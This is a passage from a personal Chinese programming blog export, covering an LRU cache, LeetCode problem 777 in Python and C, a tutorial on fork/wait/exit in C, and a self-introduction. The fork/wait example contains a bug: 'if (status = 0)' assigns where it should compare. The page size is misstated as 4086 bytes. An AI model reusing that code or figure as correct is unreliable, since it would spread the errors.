<li><p><strong>put</strong>一个新的key-value，我们会构建一个新的key-value结构体，并<strong>加入到链表中放到第一个位置</strong>，在字典中也加入新的key-value，然后判断是否溢出缓存，若溢出，那么将最久未使用也就是链表中<strong>最后一个元素删除</strong>，同时删除字典中该元素的key-value。</p>
<p>上述中我们发现我们还需要：</p>
<ol>
<li><p>在链表中新加Node并放置在第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_none</span><span class="params">(self,node)</span>:</span></span><br><span class="line">	node.prev = self.head</span><br><span class="line">   node.next = self.head.next</span><br><span class="line">   self.head.next.prev = node</span><br><span class="line">   self.head.next = node</span><br></pre></td></tr></table></figure>
</li>
<li><p>移除old_Node：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_node</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    prev = node.prev</span><br><span class="line">    new = node.next</span><br><span class="line">    prev.next = new</span><br><span class="line">    new.prev = prev</span><br></pre></td></tr></table></figure>
</li>
<li><p>将old_Node移动到第一个位置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_to_head</span><span class="params">(self,node)</span>:</span></span><br><span class="line">    self.remove_node(node)</span><br><span class="line">    self.add_none(node)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将最后一个Node删除：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_last_node</span><span class="params">(self)</span>:</span></span><br><span class="line">    last = self.tail.prev</span><br><span class="line">    self.remove_node(last)</span><br><span class="line">    <span class="keyword">return</span> last</span><br></pre></td></tr></table></figure>

<p>返回Node是为了使用它在字典中将它删除。</p>
</li>
</ol>
</li>
<li><p><strong>get</strong>一个key，查询其value，若没有，返回-1，若有，返回其value，并刷新使用时间，也就是将其key-value移动到链表第一个位置。</p>
</li>
</ol>
<p>由上述就可以构造put和get方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key, value)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :type value: int</span></span><br><span class="line"><span class="string">    :rtype: None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        newnode = new_node(key,value)</span><br><span class="line">        self.cache[key] = newnode</span><br><span class="line">        self.add_none(newnode)</span><br><span class="line">        self.size += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.size &gt; self.capacity:</span><br><span class="line">            tail = self.remove_last_node()</span><br><span class="line">            <span class="keyword">del</span> self.cache[tail.key]</span><br><span class="line">            self.size -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        node.value = value</span><br><span class="line">        self.move_to_head(node)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type key: int</span></span><br><span class="line"><span class="string">    :rtype: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    node = self.cache.get(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    self.move_to_head(node)</span><br><span class="line">    <span class="keyword">return</span> node.value</span><br></pre></td></tr></table></figure>

<p>同时对LRUcache的基本属性为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type capacity: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    self.cache = &#123;&#125;</span><br><span class="line">    self.size = <span class="number">0</span></span><br><span class="line">    self.capacity = capacity</span><br><span class="line">    self.head = new_node()</span><br><span class="line">    self.tail = new_node()</span><br><span class="line">    self.head.next = self.tail</span><br><span class="line">    self.tail.prev = self.head</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解777</title>
    <url>/2020/01/18/LeetCode%E9%A2%98%E8%A7%A3777/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第777题，在LR字符串中交换相邻字符</strong></p>
<p>在一个由 ‘L’ , ‘R’ 和 ‘X’ 三个字符组成的字符串（例如”RXXLRXRXL”）中进行移动操作。一次移动操作指用一个”LX”替换一个”XL”，或者用一个”XR”替换一个”RX”。现给定起始字符串start和结束字符串end，请编写代码，当且仅当存在一系列移动操作使得start可以转换成end时， 返回True。</p>
<p><strong>示例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">输入: start = <span class="string">"RXXLRXRXL"</span>, end = <span class="string">"XRLXXRRLX"</span></span><br><span class="line">输出: <span class="literal">True</span></span><br><span class="line">解释:</span><br><span class="line">我们可以通过以下几步将start转换成end:</span><br><span class="line">RXXLRXRXL -&gt;</span><br><span class="line">XRXLRXRXL -&gt;</span><br><span class="line">XRLXRXRXL -&gt;</span><br><span class="line">XRLXXRRXL -&gt;</span><br><span class="line">XRLXXRRLX</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<ol>
<li><code>1 &lt;= len(start) = len(end) &lt;= 10000</code>。</li>
<li><code>start</code>和<code>end</code>中的字符串仅限于<code>&#39;L&#39;</code>, <code>&#39;R&#39;</code>和<code>&#39;X&#39;</code>。</li>
</ol>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canTransform</span><span class="params">(self, start, end)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type start: str</span></span><br><span class="line"><span class="string">        :type end: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> (len(start) != len(end)):</span><br><span class="line">            <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        n = len(start)</span><br><span class="line">        sl = <span class="number">0</span></span><br><span class="line">        sr = <span class="number">0</span></span><br><span class="line">        el = <span class="number">0</span></span><br><span class="line">        er = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'L'</span>:</span><br><span class="line">                sl += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> start[i] == <span class="string">'R'</span>:</span><br><span class="line">                sr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'L'</span>:</span><br><span class="line">                el += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> end[i] == <span class="string">'R'</span>:</span><br><span class="line">                er += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (sl &gt; el) | (sr &lt; er):</span><br><span class="line">                <span class="keyword">return</span> bool(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> bool((sl == el) &amp; (sr == er) &amp; (sl + sr &lt; n))</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nlMF.png" alt="19nlMF.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">canTransform</span><span class="params">(<span class="keyword">char</span> * start, <span class="keyword">char</span> * <span class="built_in">end</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(start) != <span class="built_in">strlen</span>(<span class="built_in">end</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span> , n = <span class="built_in">strlen</span>(start);</span><br><span class="line">    <span class="keyword">int</span> sl = <span class="number">0</span>,sr = <span class="number">0</span>,el = <span class="number">0</span>,er = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'L'</span>)</span><br><span class="line">            sl++;</span><br><span class="line">        <span class="keyword">if</span>(start[i]==<span class="string">'R'</span>)</span><br><span class="line">            sr++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'L'</span>)</span><br><span class="line">            el++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">end</span>[i]==<span class="string">'R'</span>)</span><br><span class="line">            er++;</span><br><span class="line">        <span class="keyword">if</span>((sl &gt; el) || (sr &lt; er))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/18/19nYI1.png" alt="19nYI1.png"></p>
<p><strong>做题原理：</strong></p>
<p>注意：注意L只会向左移R只会向右移</p>
<ol>
<li><p>先判等start和end的长度（肯定是相等的）。</p>
</li>
<li><p>记录下start和end中’L’和’R’的个数</p>
</li>
<li><p>同时遍历start和end</p>
<p>​            <img src="https://s2.ax1x.com/2020/01/18/19nZan.png" alt="19nZan.png"></p>
</li>
</ol>
<p>发现对’L’来说对于<strong>true</strong>的start到end：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sl &lt;= el</span><br><span class="line">sr &gt;= er</span><br></pre></td></tr></table></figure>

<p>因为’L’在变化的时候只会和它的左边对换位置，即对于start来说有可能会使 <strong>i 线</strong>右边的’L’对换到 <strong>i 线</strong>的左边，导致:</p>
<p>​          <strong>sl &lt;= el</strong></p>
<p>同理，因为’R’在变化的时候只会和它右边对换位置，即对于start来说有可能会使 <strong>i 线</strong>左边的’R’对换到 <strong>i 线</strong>的右边，导致:</p>
<p>​          <strong>sr &gt;= er</strong></p>
<p>则可以用(sl &gt; el) || (sr &lt; er)来判断false。</p>
<ol start="4">
<li><p>最后如若上述条件都满足，还要保证end是由start变化而来，即要满足(sl == el) &amp;&amp; (sr == er) &amp;&amp; (sl + sr &lt; n)，则为true。(注意：sl+sr&lt;n是因为还有’X’的存在)</p>
<p>​    </p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>fork</title>
    <url>/2020/01/15/fork/</url>
    <content><![CDATA[<h1 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        一个进程，包括代码、数据和分配给进程的资源。</p>
<p>​        fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。<br>​        一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。</p>
<a id="more"></a>

<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;	</span><br><span class="line">	<span class="keyword">pid_t</span> child_pid;</span><br><span class="line">	<span class="comment">/*fork函数</span></span><br><span class="line"><span class="comment">	*作用：系统调用，产生一个子进程,调用一次返回两次</span></span><br><span class="line"><span class="comment">	*返回值：pid_t类型，在头文件中定义，通常为整形</span></span><br><span class="line"><span class="comment">	*	0	子进程返回</span></span><br><span class="line"><span class="comment">	*	ID	父进程返回的子进程ID</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	child_pid=fork();</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span>(child_pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">	<span class="keyword">if</span>(child_pid==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"the child\n"</span>);</span><br><span class="line">			sleep(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"child's pid is %d"</span>,child_pid);</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"> 			<span class="keyword">for</span>(;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"the father\n"</span>);</span><br><span class="line">               sleep(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">	&#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"I'm over\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            <strong>那么调用这个fork函数时发生了什么呢？</strong></p>
<p>​            fork函数启动一个新的进程，前面我们说过，这个进程几乎是当前进程的一个拷贝：子进程和父进程使用相同的代码段；子进程复制父进程的堆栈段和数据段。</p>
<p>​            这样，父进程的所有数据都可以留给子进程，但是，子进程一旦开始运行，虽然它继承了父进程的一切数据，但实际上数据却已经分开，相互之间不再有影响了，也就是说，它们之间不再共享任何数据了。它们再要交互信息时，只有通过进程间通信来实现。</p>
<p>​            <strong>既然它们如此相象，系统如何来区分它们呢？</strong></p>
<p>​            这是由函数的返回值来决定的。对于父进程，fork函数返回了子程序的进程号，而对于子程序，fork函数则返回零。在操作系统中，我们用ps就可以看到不同的进程号，对父进程而言，它的进程号是由比它更低层的系统调用赋予的，而对于子进程而言，它的进程号即是fork函数对父进程的返回值。在程序设计中，父进程和子进程都要调用函数fork（）下面的代码，而我们就是利用fork（）函数对父子进程的不同返回值用if…else…语句来实现让父子进程完成不同的功能。</p>
<p>​         <strong><em>正如我们上面举的例子一样。我们看到，上面例子执行时两条信息是交互无规则的打印出来的，这是父子进程独立执行的结果，虽然我们的代码似乎和串行的代码没有什么区别。</em></strong></p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>　　 如果一个大程序在运行中，它的数据段和堆栈都很大，一次fork就要复制一次，那么fork的系统开销不是很大吗？其实UNIX自有其解决的办法，大家知道，一般CPU都是以”页”为单位来分配内存空间的，每一个页都是实际物理内存的一个映像，象INTEL的CPU，其一页在通常情况下是4086字节大小，而无论是数据段还是堆栈段都是由许多”页”构成的，fork函数复制这两个段，只是”逻辑”上的，并非”物理”上的，也就是说，实际执行fork时，物理空间上两个进程的数据段和堆栈段都还是共享着的，当有一个进程写了某个数据时，这时两个进程之间的数据才有了区别，系统就将有区别的”页”从物理上也分开。系统在空间上的开销就可以达到最小。</p>
<h1 id="wait-and-exit"><a href="#wait-and-exit" class="headerlink" title="wait and exit"></a>wait and exit</h1><h2 id="定义函数wait"><a href="#定义函数wait" class="headerlink" title="定义函数wait()"></a>定义函数wait()</h2><p>​        <code>pid_t wait (int * status);</code></p>
<ul>
<li>wait()会暂时停止目前进程的执行,直到有信号来到或子进程结束。</li>
<li>如果在调用 wait()时子进程已经结束,则 wait()会立即返回子进程结束状态值</li>
<li>子进程的结束状态值会由参数 status 返回,而子进程的进程识别码也会一起返回。</li>
<li>如果不在意结束状态值,则参数<code>status</code> 可以设成 <code>NULL</code>。</li>
</ul>
<p><img src="https://i.loli.net/2019/12/19/K2htdg6MQ4bLN1P.png" alt="UTOOLS1576735868543.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pid_t</span> pid_1;</span><br><span class="line"><span class="keyword">int</span> status=<span class="number">0</span>;</span><br><span class="line">pid_1=wait(&amp;status);</span><br></pre></td></tr></table></figure>

<p><strong><code>status</code>的使用</strong></p>
<h2 id="定义函数exit"><a href="#定义函数exit" class="headerlink" title="定义函数exit()"></a>定义函数exit()</h2><p>exit() 结束当前进程/程序，在整个进程/程序中，只要调用 exit ，就结束。</p>
<p><code>void exit(int status)</code></p>
<p>传入的参数是程序退出时的状态码，0表示正常退出，其他表示非正常退出，一般都用-1或者1，标准C里有EXIT_SUCCESS和EXIT_FAILURE两个宏，用exit(EXIT_SUCCESS)可读性比较好一点。</p>
<h2 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid_1,pid_2;</span><br><span class="line">        </span><br><span class="line">    pid_1 = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid_1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"the failure\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid_1 == <span class="number">0</span>)&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"I am a child process i am going to sleep\n"</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I am a child process and I exit normally\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        pid_2 = wait(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (pid_2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Something went wrong\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (status = <span class="number">0</span>)&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exits\n"</span>,pid_2);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exited abnormally\n"</span>,pid_2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux进程</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客-自我介绍</title>
    <url>/2020/01/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="个人介绍—BMooS"><a href="#个人介绍—BMooS" class="headerlink" title="个人介绍—BMooS"></a>个人介绍—BMooS</h1><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>​            </p>
<p>​        我是一名在校学生，男，今年<del>大三</del>大四，信息安全本科在读。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFN1f.jpg" alt="lXFN1f.jpg"></p>
<h2 id="我要干什么"><a href="#我要干什么" class="headerlink" title="我要干什么"></a>我要干什么</h2><p>​        这是我的博客地址，我会在这里不断记录和分享我的学习内容。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFEkR.png" alt="lXFEkR.png"></p>
<h2 id="未完待续。。。"><a href="#未完待续。。。" class="headerlink" title="未完待续。。。"></a>未完待续。。。</h2>]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>个人介绍</tag>
        <tag>BMooS</tag>
      </tags>
  </entry>
</search>
